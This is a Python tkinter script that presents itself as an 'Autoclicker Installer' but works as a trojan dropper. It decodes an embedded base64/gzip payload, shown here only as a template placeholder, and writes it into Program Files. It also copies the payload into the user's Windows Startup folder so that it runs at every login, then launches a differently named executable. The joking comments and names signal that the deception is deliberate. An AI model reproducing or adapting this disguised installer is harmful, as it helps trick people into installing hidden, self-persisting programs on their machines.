try:
    import base64, gzip
    data = gzip.decompress(base64.b64decode(b'{{./itsprobablyfine.exe}}'))
except:
    data = b""

from tkinter import Tk, Label, HORIZONTAL
from tkinter.ttk import Progressbar, Button
import tkinter.messagebox
import os, subprocess, sys


# This definitely installs an autoclicker...

dev = not (getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'))

tk = Tk()
tk.title("Autoclicker Installer")
tk.geometry("300x100")

def install():
    label.config(text="Installing Autoclicker...")
    progressbar.pack()
    run.pack_forget()
    progressbar.start(10)
    try:
        if not os.path.exists("C:/Program Files/IAutoclicker"):
            os.mkdir("C:/Program Files/IAutoclicker")
        with open("C:/Program Files/IAutoclicker/autoclickr.exe", "wb") as f:
            f.write(data)
    except:
        if not dev:
            tkinter.messagebox.showerror("Error", "You need to run this as an administrator. Please restart the program as an administrator. The program will now exit.")
            sys.exit(1)
    try:
        if not dev:
            with open("C:/Users/destr/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/autoclickr.exe", "wb") as f:
                f.write(data)
            with open("C:/Users/destr/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/AutoclickerV1.exe", "wb") as f:
                f.write(data)
    except:
        if not dev:
            tkinter.messagebox.showerror("Error", "You need to run this as an administrator. Please restart the program as an administrator. The program will now exit.")
            sys.exit(1)
    def done():
        progressbar.stop()
        progressbar.pack_forget()
        openbtn.pack()
        label.config(text="Done!")
    tk.after(1000, done)

def start():
    subprocess.Popen("C:/Program Files/IAutoclicker/hmmm.exe")
    tk.destroy()


label = Label(tk, text="Autoclicker Installer", font=("Aptos", 15))
label.pack()
progressbar = Progressbar(tk, orient=HORIZONTAL, length=200, mode='indeterminate')
openbtn = Button(tk, text="Launch Autoclicker & Exit", command=start)

run = Button(tk, text="Install", command=install)
run.pack()

tk.mainloop()